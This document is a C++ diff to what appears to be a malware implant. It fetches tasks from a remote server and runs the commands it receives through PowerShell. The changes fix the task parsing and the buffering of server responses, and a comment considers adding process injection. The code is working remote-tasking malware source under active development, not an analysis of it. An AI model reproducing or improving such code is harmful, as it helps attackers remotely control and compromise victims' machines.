@@ -23,12 +23,11 @@ bool runTask(string outBuffer, DWORD dwSize) {
 
     size_t pipePos = outBuffer.find('|');
 
-    if (!pipePos) return false;
+    if (pipePos == string::npos) return false;
 
     string cmd = outBuffer.substr(0, pipePos);
 
-    if (cmd == "powershell")
-        std::cout << runPSCommand(outBuffer.substr(outBuffer.find("|" + 1)));
+    if (cmd == "powershell") runPSCommand(outBuffer.substr(pipePos + 1));
 
     return true;
 }
@@ -130,15 +129,16 @@ bool fetchTasks(char** outBuffer, DWORD* dwSizeOut) {
 
         // append chunk to output
         char* newBuf = new char[*dwSizeOut + dwOut];
+
         if (*outBuffer != nullptr) {
             memcpy(newBuf, *outBuffer, *dwSizeOut);
             delete[] (*outBuffer);
         }
+
         memcpy(newBuf + *dwSizeOut, responseBuf, dwOut);
 
         *outBuffer = newBuf;
-        *dwSizeOut = dwOut;
-
+        *dwSizeOut += dwOut;
         delete[] responseBuf;
     }
 
@@ -150,7 +150,7 @@ bool fetchTasks(char** outBuffer, DWORD* dwSizeOut) {
 }
 
 string runPSCommand(string command) {
-    char psBuffer[4096];
+    char psBuffer[DEFAULT_PS_BUFLEN];
     string res;
 
     string powershellCommand =
@@ -172,8 +172,6 @@ string runPSCommand(string command) {
 
     // TODO: Make this process injection?
 }
-
-void fetchServerCertificate(HINTERNET hConnection) {}
 
 int main(int argc, const char** argv) {
     // Run all checks
@@ -209,3 +207,4 @@ int main(int argc, const char** argv) {
     }
 
     return 0;
+}
